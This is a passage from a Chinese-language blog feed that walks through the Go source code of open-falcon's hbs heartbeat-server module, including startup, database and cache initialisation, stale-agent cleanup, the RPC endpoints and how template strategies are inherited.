class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//M map[string][]*model.Expression</span></span><br><span class="line">expressionMap := g.ExpressionMap.Get()</span><br><span class="line"><span class="keyword">for</span> _, expressions := <span class="keyword">range</span> expressionMap &#123;</span><br><span class="line"><span class="keyword">for</span> _, expression := <span class="keyword">range</span> expressions &#123;</span><br><span class="line">m[expression.Metric] = expression.Metric</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.FilterMap.ReInit(m)  <span class="comment">// 设置获取到的map数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-judge源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-judge源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon judge源码分析&quot;&gt;&lt;/a&gt;open-falcon judge源码分析&lt;/
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon hbs 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/hbs%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/hbs%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:45.159Z</published>
    <updated>2020-01-21T09:06:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-hbs源码分析"><a href="#open-falcon-hbs源码分析" class="headerlink" title="open-falcon hbs源码分析"></a>open-falcon hbs源码分析</h2><p>本篇文章主要分析下open-falcon中hbs如何实现的：</p><p>主流程再modules/hbs/main.go模块中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"><span class="comment">// 初始化数据库，检查数据库是否可以连接，连接失败退出。</span></span><br><span class="line">db.Init()</span><br><span class="line">    <span class="comment">// 初始化缓存，从数据库中查询数据加载到缓存中。</span></span><br><span class="line">cache.Init()</span><br><span class="line"><span class="comment">// 删除没有心跳的agent</span></span><br><span class="line"><span class="keyword">go</span> cache.DeleteStaleAgents()</span><br><span class="line"><span class="comment">// 启动hbs http服务</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// 启动 rpc服务</span></span><br><span class="line"><span class="keyword">go</span> rpc.Start()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//信号量检查</span></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">db.DB.Close()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>db初始化函数Init:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">DB, err = sql.Open(<span class="string">"mysql"</span>, g.Config().Database)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"open db fail:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DB.SetMaxOpenConns(g.Config().MaxConns)</span><br><span class="line">DB.SetMaxIdleConns(g.Config().MaxIdle)</span><br><span class="line"></span><br><span class="line">err = DB.Ping()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"ping db fail:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化缓存数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">"cache begin"</span>)</span><br><span class="line"><span class="comment">// 查询group与plugins的关系到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#1 GroupPlugins..."</span>)</span><br><span class="line">GroupPlugins.Init()</span><br><span class="line"><span class="comment">// 查询group与template的关系到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#2 GroupTemplates..."</span>)</span><br><span class="line">GroupTemplates.Init()</span><br><span class="line"><span class="comment">// 查询host与group的关系到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#3 HostGroupsMap..."</span>)</span><br><span class="line">HostGroupsMap.Init()</span><br><span class="line"><span class="comment">//查询所有的host信息到缓存，方便查询hostname-&gt;id</span></span><br><span class="line">log.Println(<span class="string">"#4 HostMap..."</span>)</span><br><span class="line">HostMap.Init()</span><br><span class="line"><span class="comment">//查询所有的template信息到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#5 TemplateCache..."</span>)</span><br><span class="line">TemplateCache.Init()</span><br><span class="line"><span class="comment">//查询对应模块的策略信息到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#6 Strategies..."</span>)</span><br><span class="line">Strategies.Init(TemplateCache.GetMap())</span><br><span class="line"><span class="comment">//查询host与template的缓存信息，一个id对应多个模块ID</span></span><br><span class="line">log.Println(<span class="string">"#7 HostTemplateIds..."</span>)</span><br><span class="line">HostTemplateIds.Init()</span><br><span class="line"><span class="comment">//查询所有表达式到缓存中</span></span><br><span class="line">log.Println(<span class="string">"#8 ExpressionCache..."</span>)</span><br><span class="line">ExpressionCache.Init()</span><br><span class="line"><span class="comment">// 查询被监控的host信息缓存</span></span><br><span class="line">log.Println(<span class="string">"#9 MonitoredHosts..."</span>)</span><br><span class="line">MonitoredHosts.Init()</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">"cache done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> LoopInit() <span class="comment">//定时查询更新，比较消耗资源。</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定时检查当前agents列表中的信息心跳最后更新时间：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteStaleAgents</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 一天都没有心跳的Agent，从内存中干掉</span></span><br><span class="line">before := time.Now().Unix() - <span class="number">3600</span>*<span class="number">24</span></span><br><span class="line">keys := Agents.Keys()</span><br><span class="line">count := <span class="built_in">len</span>(keys)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">curr, _ := Agents.Get(keys[i])</span><br><span class="line"><span class="keyword">if</span> curr.LastUpdate &lt; before &#123;</span><br><span class="line">Agents.Delete(curr.ReportRequest.Hostname)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>http服务初始化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//init函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">configCommonRoutes()  <span class="comment">//注册通用api</span></span><br><span class="line">configProcRoutes()    <span class="comment">//注册获取策略等信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rpc接口初始化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">addr := g.Config().Listen</span><br><span class="line"></span><br><span class="line">server := rpc.NewServer()</span><br><span class="line"><span class="comment">// server.Register(new(filter.Filter))</span></span><br><span class="line">server.Register(<span class="built_in">new</span>(Agent))</span><br><span class="line">server.Register(<span class="built_in">new</span>(Hbs))</span><br><span class="line"></span><br><span class="line">l, e := net.Listen(<span class="string">"tcp"</span>, addr)</span><br><span class="line"><span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"listen error:"</span>, e)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"listening"</span>, addr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := l.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"listener accept fail:"</span>, err)</span><br><span class="line">time.Sleep(time.Duration(<span class="number">100</span>) * time.Millisecond)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> server.ServeCodec(jsonrpc.NewServerCodec(conn))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本流程分析完毕，我们主要来看下hbs提供出来的rpc函数有那些：</p><p>agent rpc接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MinePlugin函数主要从缓存中查询plugins插件列表</span><br><span class="line">ReportStatus获取到agent来的状态数据，更新缓存中的数据</span><br><span class="line">TrustableIps白名单，从配置文件中读取</span><br><span class="line">BuiltinMetrics，agent按照server端的配置，按需采集的metric</span><br></pre></td></tr></table></figure><p>hbs rpc接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GetExpressions 获取查询表达式</span><br><span class="line">GetStrategies 获取strategy策略，用于judge调用</span><br></pre></td></tr></table></figure><p>我们来看下这个函数GetStrategies，这个函数主要用于给judge定时更新策略的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Hbs)</span> <span class="title">GetStrategies</span><span class="params">(req model.NullRpcRequest, reply *model.StrategiesResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">reply.HostStrategies = []*model.HostStrategy&#123;&#125;</span><br><span class="line"><span class="comment">// 一个机器ID对应多个模板ID</span></span><br><span class="line">hidTids := cache.HostTemplateIds.GetMap()</span><br><span class="line">sz := <span class="built_in">len</span>(hidTids)</span><br><span class="line"><span class="keyword">if</span> sz == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Judge需要的是hostname，此处要把HostId转换为hostname</span></span><br><span class="line"><span class="comment">// 查出的hosts，是不处于维护时间内的</span></span><br><span class="line">hosts := cache.MonitoredHosts.Get()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(hosts) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// 所有机器都处于维护状态，汗</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查询所有模板信息</span></span><br><span class="line">tpls := cache.TemplateCache.GetMap()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tpls) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询所有策略信息</span></span><br><span class="line">strategies := cache.Strategies.GetMap()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(strategies) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 做个索引，给一个tplId，可以很方便的找到对应了哪些Strategy</span></span><br><span class="line">tpl2Strategies := Tpl2Strategies(strategies)</span><br><span class="line"></span><br><span class="line">hostStrategies := <span class="built_in">make</span>([]*model.HostStrategy, <span class="number">0</span>, sz)</span><br><span class="line"><span class="keyword">for</span> hostId, tplIds := <span class="keyword">range</span> hidTids &#123;</span><br><span class="line"></span><br><span class="line">h, exists := hosts[hostId]</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算当前host配置了哪些监控策略</span></span><br><span class="line">ss := CalcInheritStrategies(tpls, tplIds, tpl2Strategies)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ss) &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hs := model.HostStrategy&#123;</span><br><span class="line">Hostname:   h.Name,</span><br><span class="line">Strategies: ss,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hostStrategies = <span class="built_in">append</span>(hostStrategies, &amp;hs)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reply.HostStrategies = hostStrategies</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tpl2Strategies函数根据strategies查询所有模板信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Tpl2Strategies</span><span class="params">(strategies <span class="keyword">map</span>[<span class="keyword">int</span>]*model.Strategy)</span> <span class="title">map</span>[<span class="title">int</span>][]*<span class="title">model</span>.<span class="title">Strategy</span></span> &#123;</span><br><span class="line">ret := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>][]*model.Strategy)</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> strategies &#123;</span><br><span class="line"><span class="keyword">if</span> s == <span class="literal">nil</span> || s.Tpl == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, exists := ret[s.Tpl.Id]; exists &#123;</span><br><span class="line">ret[s.Tpl.Id] = <span class="built_in">append</span>(ret[s.Tpl.Id], s)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ret[s.Tpl.Id] = []*model.Strategy&#123;s&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CalcInheritStrategies函数用于计算当前host机器有多少策略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CalcInheritStrategies</span><span class="params">(allTpls <span class="keyword">map</span>[<span class="keyword">int</span>]*model.Template, tids []<span class="keyword">int</span>, tpl2Strategies <span class="keyword">map</span>[<span class="keyword">int</span>][]*model.Strategy)</span> []<span class="title">model</span>.<span class="title">Strategy</span></span> &#123;</span><br><span class="line"><span class="comment">// 根据模板的继承关系，找到每个机器对应的模板全量</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * host_id =&gt;</span></span><br><span class="line"><span class="comment"> * |a |d |a |a |a |</span></span><br><span class="line"><span class="comment"> * |  |  |b |b |f |</span></span><br><span class="line"><span class="comment"> * |  |  |  |c |  |</span></span><br><span class="line"><span class="comment"> * |  |  |  |  |  |</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">tpl_buckets := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, tid := <span class="keyword">range</span> tids &#123;</span><br><span class="line">        <span class="comment">// 查找所有id的parentid</span></span><br><span class="line">ids := cache.ParentIds(allTpls, tid)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ids) &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">tpl_buckets = <span class="built_in">append</span>(tpl_buckets, ids)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每个host 关联的模板，有继承关系的放到同一个bucket中，其他的放在各自单独的bucket中</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * host_id =&gt;</span></span><br><span class="line"><span class="comment"> * |a |d |a |</span></span><br><span class="line"><span class="comment"> * |b |  |f |</span></span><br><span class="line"><span class="comment"> * |c |  |  |</span></span><br><span class="line"><span class="comment"> * |  |  |  |</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">count := <span class="built_in">len</span>(tpl_buckets)</span><br><span class="line">uniq_tpl_buckets := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line"><span class="keyword">var</span> valid <span class="keyword">bool</span> = <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; count; j++ &#123;</span><br><span class="line"><span class="keyword">if</span> i == j &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> slice_int_eq(tpl_buckets[i], tpl_buckets[j]) &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> slice_int_lt(tpl_buckets[i], tpl_buckets[j]) &#123;</span><br><span class="line">valid = <span class="literal">false</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> valid &#123;</span><br><span class="line">uniq_tpl_buckets = <span class="built_in">append</span>(uniq_tpl_buckets, tpl_buckets[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承覆盖父模板策略，得到每个模板聚合后的策略列表</span></span><br><span class="line">strategies := []model.Strategy&#123;&#125;</span><br><span class="line"></span><br><span class="line">exists_by_id := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">for</span> _, bucket := <span class="keyword">range</span> uniq_tpl_buckets &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始计算一个桶，先计算老的tid，再计算新的，所以可以覆盖</span></span><br><span class="line"><span class="comment">// 该桶最终结果</span></span><br><span class="line">bucket_stras_map := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*model.Strategy)</span><br><span class="line"><span class="keyword">for</span> _, tid := <span class="keyword">range</span> bucket &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个tid对应的策略列表</span></span><br><span class="line">the_tid_stras := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*model.Strategy)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> stras, ok := tpl2Strategies[tid]; ok &#123;</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> stras &#123;</span><br><span class="line">uuid := fmt.Sprintf(<span class="string">"metric:%s/tags:%v"</span>, s.Metric, utils.SortedTags(s.Tags))</span><br><span class="line"><span class="keyword">if</span> _, ok2 := the_tid_stras[uuid]; ok2 &#123;</span><br><span class="line">the_tid_stras[uuid] = <span class="built_in">append</span>(the_tid_stras[uuid], s)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">the_tid_stras[uuid] = []*model.Strategy&#123;s&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 覆盖父模板</span></span><br><span class="line"><span class="keyword">for</span> uuid, ss := <span class="keyword">range</span> the_tid_stras &#123;</span><br><span class="line">bucket_stras_map[uuid] = ss</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">last_tid := bucket[<span class="built_in">len</span>(bucket)<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换所有策略的模板为最年轻的模板</span></span><br><span class="line"><span class="keyword">for</span> _, ss := <span class="keyword">range</span> bucket_stras_map &#123;</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> ss &#123;</span><br><span class="line">valStrategy := *s</span><br><span class="line"><span class="comment">// exists_by_id[s.Id] 是根据策略ID去重，不太确定是否真的需要，不过加上肯定没问题</span></span><br><span class="line"><span class="keyword">if</span> _, exist := exists_by_id[valStrategy.Id]; !exist &#123;</span><br><span class="line"><span class="keyword">if</span> valStrategy.Tpl.Id != last_tid &#123;</span><br><span class="line">valStrategy.Tpl = allTpls[last_tid]</span><br><span class="line">&#125;</span><br><span class="line">strategies = <span class="built_in">append</span>(strategies, valStrategy)</span><br><span class="line">exists_by_id[valStrategy.Id] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> strategies</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hbs中主要的功能分析完毕。相应的需要结合judge和agent来看各个rpc接口调用关系了。</p>]]></content>
    
    <summary type="html">
    
      
      
